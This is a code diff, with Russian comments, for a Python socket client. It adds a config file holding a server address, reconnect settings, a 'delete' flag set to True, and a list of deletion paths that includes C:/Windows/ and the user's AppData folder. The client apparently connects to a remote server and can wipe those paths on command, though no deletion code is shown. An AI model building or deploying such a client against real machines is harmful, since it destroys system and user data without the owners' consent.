@@ -4,12 +4,43 @@ import socket
 import configparser
 from sys import argv
 
+# Инициализация файла конфигурации
+config = configparser.ConfigParser()
+config.read('client_config.ini')
+try:
+    if(config['CONFIG']):
+        pass
+except:
+    config['CONFIG'] = {
+        'config' : 'config' ,
+        'server_ip':'10.0.20.200',
+        'server_port':'49999',
+        'running':'False',
+        'recon':'5',
+        'debug':'False',
+        'delete':'True'
+    }
+
+    config['DELETE_PATH'] = {
+        'dp' : 'first',
+        'test' : './test/',
+        'test1' : './test1/',
+        'windows' : 'C:/Windows/',
+        'local' : '&appdata&/../Local/'
+    }
+
+    with open('client_config.ini', 'w') as configfile:
+        config.write(configfile)
+
 # Настройки
-server_IP = '10.0.20.200'    # Адрес сервера
-server_PORT = 49999          # Порт сервера
-recon = 5       # Количество попыток переподключения к серверу
-sa = argv[1:]   # Получение аргументов для запуска скрипта
+
+server_IP = config['CONFIG']['server_ip']           # Адрес сервера
+server_PORT = int(config['CONFIG']['server_port'])  # Порт сервера
+
+recon = int(config['CONFIG']['recon'])              # Количество попыток переподключения к серверу
 con = False     # Переменная подключения
+
+sa = argv[1:]                   # Получение аргументов для запуска скрипта
 
 myname = socket.gethostname()   # Имя клиента (имя компьютера)
 
